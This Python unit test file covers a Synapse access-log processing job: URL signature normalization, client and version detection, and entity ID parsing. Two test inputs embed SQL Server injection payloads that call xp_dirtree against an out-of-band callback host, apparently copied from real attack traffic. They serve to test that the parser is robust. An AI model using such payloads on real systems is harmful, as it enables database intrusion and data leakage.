import unittest
import sys
from unittest.mock import Mock

sys.modules['utils'] = Mock()
from src.scripts.glue_jobs import process_access_record


class TestTransformedAccessRecord(unittest.TestCase):

    def test_normalized_signature_for_md5_in_url(self):
        expected_output = "/entity/md5/#"
        real_output = process_access_record.get_normalized_method_signature("start/repo/v1/entity/md5/132-456thfd")
        self.assertEqual(expected_output, real_output)

    def test_normalized_signature_for_name_in_url(self):
        expected_output = "/evaluation/name/#"
        real_output = process_access_record.get_normalized_method_signature("any/repo/v1/evaluation/name/test/random")
        self.assertEqual(expected_output, real_output)

    def test_normalized_signature_for_alias_in_url(self):
        expected_output = "/entity/alias/#"
        real_output = process_access_record.get_normalized_method_signature("repo/v1/entity/alias/XYZNDY")
        self.assertEqual(expected_output, real_output)

    def test_normalized_signature_for_id_in_url(self):
        expected_output = "/entity/#/random/#"
        real_output = process_access_record.get_normalized_method_signature("repo/v1/entity/syn123456/random/123")
        self.assertEqual(expected_output, real_output)

    def test_normalized_signature_for_invalid_url(self):
        expected_output = "INVALID URL"
        real_output = process_access_record.get_normalized_method_signature("start/repo/entity/syn123456")
        self.assertEqual(expected_output, real_output)

    def test_normalized_signature_for_random_valid_url(self):
        expected_output = "/admin/locks"
        real_output = process_access_record.get_normalized_method_signature("repo/v1/admin/locks")
        self.assertEqual(expected_output, real_output)

    def test_normalized_signature_with_space_at_end(self):
        expected_output = "/entity/#"
        real_output = process_access_record.get_normalized_method_signature("/repo/v1/entity/syn35487770%20")
        self.assertEqual(expected_output, real_output)

    def test_normalized_signature_with_space_before_synId(self):
        expected_output = "/entity/#/annotations2"
        real_output = process_access_record.get_normalized_method_signature(
            "/repo/v1/entity/%20syn24829449/annotations2")
        self.assertEqual(expected_output, real_output)

    def test_normalized_signature_with_space_in_middle(self):
        expected_output = "/entity/#/uploaddestination"
        real_output = process_access_record.get_normalized_method_signature(
            "/file/v1/entity/syn52201498%20%20/uploadDestination")
        self.assertEqual(expected_output, real_output)

    def test_normalized_signature_with_squareBracket(self):
        expected_output = "/accessrequirement/#/submissions"
        real_output = process_access_record.get_normalized_method_signature(
            "/repo/v1/accessRequirement/%5B9605670%5D/submissions")
        self.assertEqual(expected_output, real_output)

    def test_normalized_signature_for_synId_with_version(self):
        expected_output = "/entity/#/table/transaction/async/get/#"
        real_output = process_access_record.get_normalized_method_signature(
            "/repo/v1/entity/syn51718024.1/table/transaction/async/get/28738082")
        self.assertEqual(expected_output, real_output)

    def test_normalized_signature_with_special_char_at_end(self):
        expected_output = "/entity/#/wiki/#"
        real_output = process_access_record.get_normalized_method_signature("/repo/v1/entity/syn6131484/wiki/402033@")
        self.assertEqual(expected_output, real_output)

    def test_normalized_signature_with_semicolon_with_url(self):
        expected_output = "/entity/#/wiki/#"
        real_output = process_access_record.get_normalized_method_signature(
            "/repo/v1/entity/syn4939906/wiki/235909;%20Combination%20Index%20Validation%20Studies%20(2%20drug%20combinations)%20-%20syn4939876%20-%20Wiki%20(Synapse | Sage Bionetworks ")
        self.assertEqual(expected_output, real_output)

    def test_normalized_signature_with_semicolon_with_text(self):
        expected_output = "/entity/#/wiki/"
        real_output = process_access_record.get_normalized_method_signature("/repo/v1/entity/syn3193805/wiki/;D12")
        self.assertEqual(expected_output, real_output)

    def test_normalized_signature_with_semicolon_in_middle(self):
        expected_output = "/entity/#/wiki2/#/wikihistory"
        real_output = process_access_record.get_normalized_method_signature(
            "/repo/v1/entity/syn2811262/wiki2/78388;/wikihistory")
        self.assertEqual(expected_output, real_output)

    def test_normalized_signature_with_semicolon_in_middle_with_text(self):
        expected_output = "/entity/#/wiki2/#/wikihistory"
        real_output = process_access_record.get_normalized_method_signature(
            "/repo/v1/entity/syn2811262/wiki2/78388;DA12/wikihistory")
        self.assertEqual(expected_output, real_output)

    def test_normalized_signature_with_new_line(self):
        expected_output = "/entity/#/uploaddestination"
        real_output = process_access_record.get_normalized_method_signature(
            "/file/v1/entity/syn51320810%0A/uploadDestination")
        self.assertEqual(expected_output, real_output)

    def test_normalized_signature_with_multiple_new_line(self):
        expected_output = "/entity/#/bundle2"
        real_output = process_access_record.get_normalized_method_signature("/repo/v1/entity/syn26592177%0A%0A/bundle2")
        self.assertEqual(expected_output, real_output)

    def test_normalized_signature_with_carriageReturn(self):
        expected_output = "/entity/#/annotations2"
        real_output = process_access_record.get_normalized_method_signature(
            "/repo/v1/entity/syn50920803%0D%0D/annotations2")
        self.assertEqual(expected_output, real_output)

    def test_normalized_signature_with_multiple_carriageReturn(self):
        expected_output = "/entity/#/bundle2"
        real_output = process_access_record.get_normalized_method_signature("/repo/v1/entity/syn50920803%0D%0D/bundle2")
        self.assertEqual(expected_output, real_output)

    def test_normalized_signature_with_carriageReturn_before_synId(self):
        expected_output = "/entity/#/uploaddestination"
        real_output = process_access_record.get_normalized_method_signature(
            "/file/v1/entity/%09%0Asyn51770520/uploadDestination")
        print("print its working")
        self.assertEqual(expected_output, real_output)

    def test_normalized_signature_for_drs_access_url_with_synId(self):
        expected_output = "/objects/#/access/#"
        real_output = process_access_record.get_normalized_method_signature(
            "/ga4gh/drs/v1/objects/syn27076339.1/access/FileEntity_syn27076339.1_88312772")
        self.assertEqual(expected_output, real_output)

    def test_normalized_signature_for_drs_access_url_with_filehandleId(self):
        expected_output = "/objects/#/access/#"
        real_output = process_access_record.get_normalized_method_signature(
            "/ga4gh/drs/v1/objects/fh127243131/access/127243131")
        self.assertEqual(expected_output, real_output)

    def test_normalized_signature_for_drs_object(self):
        expected_output = "/objects/#"
        real_output = process_access_record.get_normalized_method_signature("/ga4gh/drs/v1/objects/syn35423183.1")
        self.assertEqual(expected_output, real_output)

    def test_normalized_signature_for_drs_object_for_fileHandleId(self):
        expected_output = "/objects/#"
        real_output = process_access_record.get_normalized_method_signature("/ga4gh/drs/v1/objects/fh123")
        self.assertEqual(expected_output, real_output)

    def test_normalized_signature_for_schema_type(self):
        expected_output = "/schema/type/registered/#"
        real_output = process_access_record.get_normalized_method_signature(
            "/repo/v1/schema/type/registered/a245ac37480fc40739836ce61801d19f1-my.schema-0.36652.1")
        self.assertEqual(expected_output, real_output)

    def test_normalized_signature_for_evaluation_submission_with_string_id(self):
        expected_output = "/evaluation/submission/#/status"
        real_output = process_access_record.get_normalized_method_signature(
            "/repo/v1/evaluation/submission/9720221_curl_168/status")
        self.assertEqual(expected_output, real_output)

    def test_normalized_signature_for_evaluation_submission_with_file_handle_id(self):
        expected_output = "/evaluation/submission/#/file/#"
        real_output = process_access_record.get_normalized_method_signature(
            "/repo/v1/evaluation/submission/9720221_curl_168/file/123")
        self.assertEqual(expected_output, real_output)

    def test_normalized_signature_for_data_access_submission_id_with_vr(self):
        expected_output = "/dataaccesssubmission/#"
        real_output = process_access_record.get_normalized_method_signature(
            "/repo/v1/dataAccessSubmission/7416vr")
        self.assertEqual(expected_output, real_output)

    def test_normalized_signature_for_entity_with_version_in_end(self):
        expected_output = "/entity/#/version/#"
        real_output = process_access_record.get_normalized_method_signature(
            "/repo/v1/entity/syn9692796/version/98")
        self.assertEqual(expected_output, real_output)

    def test_normalized_signature_for_entity_with_vesion_in_middle(self):
        expected_output = "/entity/#/version/#/json"
        real_output = process_access_record.get_normalized_method_signature(
            "/repo/v1/entity/syn25830585/version/1/json")
        self.assertEqual(expected_output, real_output)


    def test_normalized_signature_for_team_member_with_query_parameters(self):
        expected_output = "/teammembers/#"
        real_output = process_access_record.get_normalized_method_signature(
            "/repo/v1/teamMembers/3431460&limit=50&offset=0")
        self.assertEqual(expected_output, real_output)

    def test_normalized_signature_for_team_with_singleQuotes(self):
        expected_output = "/team/#"
        real_output = process_access_record.get_normalized_method_signature("/repo/v1/team/3409011'")
        self.assertEqual(expected_output, real_output)

    def test_normalized_signature_for_team_with_bracket(self):
        expected_output = "/team/#"
        real_output = process_access_record.get_normalized_method_signature("/repo/v1/team/3409011)")
        self.assertEqual(expected_output, real_output)

    def test_normalized_signature_for_team_with_comma(self):
        expected_output = "/team/#"
        real_output = process_access_record.get_normalized_method_signature("/repo/v1/team/3409011,")
        self.assertEqual(expected_output, real_output)

    def test_normalized_signature_for_team_with_dot(self):
        expected_output = "/team/#"
        real_output = process_access_record.get_normalized_method_signature("/repo/v1/team/3409011.")
        self.assertEqual(expected_output, real_output)

    def test_normalized_signature_for_bundle(self):
        expected_output = "/user/bundle"
        real_output = process_access_record.get_normalized_method_signature(
            "/repo/v1/user/bundle;declare%20@q%20varchar(99);set%20@q='%5C%5Cb2eg7v959m35phq0mzthfsysajgf491a0yroff72xqm.oasti'+'fy.com%5Cfmt';%20exec%20master.dbo.xp_dirtree%20@q;--%20")
        self.assertEqual(expected_output, real_output)

    def test_normalized_signature_for_two_fa(self):
        expected_output = "/2fa/enroll"
        real_output = process_access_record.get_normalized_method_signature("/auth/v1/2fa/enroll")
        self.assertEqual(expected_output, real_output)

    def test_normalized_signature_for_invalid_url(self):
        expected_output = "INVALID URL"
        real_output = process_access_record.get_normalized_method_signature("/repo/v1;declare%20@q%20varchar(99);"
        "set%20@q='%5C%5Caq4fvux4xlr4dgezayhg3rmryi4es8p9oxfn3kqbe0.oasti'+' %5Cicr';%20exec%20master.dbo.xp_dirtree"
         "%20@q;--%20/user/bundle")
        self.assertEqual(expected_output, real_output)

    def test_get_client_for_web(self):
        expected_output = "WEB"
        real_output = process_access_record.get_client("Synapse-Web-Client/435.0")
        self.assertEqual(expected_output, real_output)

    def test_get_client_for_java(self):
        expected_output = "JAVA"
        real_output = process_access_record.get_client("Synapse-Java-Client/431.0")
        self.assertEqual(expected_output, real_output)

    def test_get_client_for_old_java(self):
        expected_output = "JAVA"
        real_output = process_access_record.get_client("Synpase-Java-Client/434.0")
        self.assertEqual(expected_output, real_output)

    def test_get_client_for_synapser(self):
        expected_output = "SYNAPSER"
        real_output = process_access_record.get_client("synapser/0.15.33synapseclient/2.7.0 python-requests/2.28.2")
        self.assertEqual(expected_output, real_output)

    def test_get_client_for_r(self):
        expected_output = "R"
        real_output = process_access_record.get_client("synapseRClient/test")
        self.assertEqual(expected_output, real_output)

    def test_get_client_for_commandline(self):
        expected_output = "COMMAND_LINE"
        real_output = process_access_record.get_client("synapsecommandlineclient/test")
        self.assertEqual(expected_output, real_output)

    def test_get_client_for_python(self):
        expected_output = "PYTHON"
        real_output = process_access_record.get_client("python/synapseclient/test")
        self.assertEqual(expected_output, real_output)

    def test_get_client_for_elb(self):
        expected_output = "ELB_HEALTHCHECKER"
        real_output = process_access_record.get_client("ELB-HealthChecker/2.0")
        self.assertEqual(expected_output, real_output)

    def test_get_client_for_stack(self):
        expected_output = "STACK"
        real_output = process_access_record.get_client("test/SynapseRepositoryStack/432")
        self.assertEqual(expected_output, real_output)

    def test_get_client_for_unknown(self):
        expected_output = "UNKNOWN"
        real_output = process_access_record.get_client("Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0)")
        self.assertEqual(expected_output, real_output)

    def test_get_client_for_none(self):
        expected_output = "UNKNOWN"
        real_output = process_access_record.get_client(None)
        self.assertEqual(expected_output, real_output)

    def test_get_client_version_for_web(self):
        expected_output = "435.0"
        real_output = process_access_record.get_client_version("WEB", "Synapse-Web-Client/435.0")
        self.assertEqual(expected_output, real_output)

    def test_get_client_version_for_java(self):
        expected_output = "431.0"
        real_output = process_access_record.get_client_version("JAVA", "Synapse-Java-Client/431.0")
        self.assertEqual(expected_output, real_output)

    def test_get_client_version_for_old_java(self):
        expected_output = "434.0"
        real_output = process_access_record.get_client_version("JAVA", "Synpase-Java-Client/434.0")
        self.assertEqual(expected_output, real_output)

    def test_get_client_version_for_synapser(self):
        expected_output = "0.15.33"
        real_output = process_access_record.get_client_version("SYNAPSER", "synapser/0.15.33")
        self.assertEqual(expected_output, real_output)

    def test_get_client_version_for_r(self):
        expected_output = "2"
        real_output = process_access_record.get_client_version("R", "synapseRClient/2")
        self.assertEqual(expected_output, real_output)

    def test_get_client_version_for_commandline(self):
        expected_output = "123"
        real_output = process_access_record.get_client_version("COMMAND_LINE", "synapsecommandlineclient/123")
        self.assertEqual(expected_output, real_output)

    def test_get_client_version_for_python(self):
        expected_output = "4.0"
        real_output = process_access_record.get_client_version("PYTHON", "synapseclient/4.0")
        self.assertEqual(expected_output, real_output)

    def test_get_client_version_for_elb(self):
        expected_output = "2.0"
        real_output = process_access_record.get_client_version("ELB_HEALTHCHECKER", "ELB-HealthChecker/2.0")
        self.assertEqual(expected_output, real_output)

    def test_get_client_version_for_stack(self):
        expected_output = "432"
        real_output = process_access_record.get_client_version("STACK", "SynapseRepositoryStack/432")
        self.assertEqual(expected_output, real_output)

    def test_get_client_version_for_unknown(self):
        real_output = process_access_record.get_client_version("UNKNOWN",
                                                               "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0)")
        self.assertIsNone(real_output)

    def test_get_client_version_for_none_client(self):
        real_output = process_access_record.get_client_version(None, "testClient")
        self.assertIsNone(real_output)

    def test_get_client_version_for_none_agent(self):
        real_output = process_access_record.get_client_version("STACK", None)
        self.assertIsNone(real_output)

    def test_get_entity_id_for_syn_id(self):
        expected_output = 12223809
        real_output = process_access_record.get_entity_id("/repo/v1/entity/syn12223809")
        self.assertEqual(expected_output, real_output)

    def test_get_entity_id_for_id_without_syn(self):
        expected_output = 1234
        real_output = process_access_record.get_entity_id("/repo/v1/entity/1234")
        self.assertEqual(expected_output, real_output)

    def test_get_entity_id_without_id(self):
        real_output = process_access_record.get_entity_id("/repo/v1/version")
        self.assertIsNone(real_output)

    def test_get_entity_id_with_none(self):
        real_output = process_access_record.get_entity_id(None)
        self.assertIsNone(real_output)

    def test_get_entity_id_for_url_having_two_syn(self):
        expected_output = 1234
        real_output = process_access_record.get_entity_id("/repo/v1/entity/syn1234/check/syn123456")
        self.assertEqual(expected_output, real_output)

    def test_get_entity_id_for_case_insensitive(self):
        expected_output = 1234
        real_output = process_access_record.get_entity_id("/repo/v1/entity/Syn1234/check")
        self.assertEqual(expected_output, real_output)

    def test_get_entity_id_for_with_version(self):
        expected_output = 12345
        real_output = process_access_record.get_entity_id("/repo/v1/entity/SYN12345.1/check")
        self.assertEqual(expected_output, real_output)
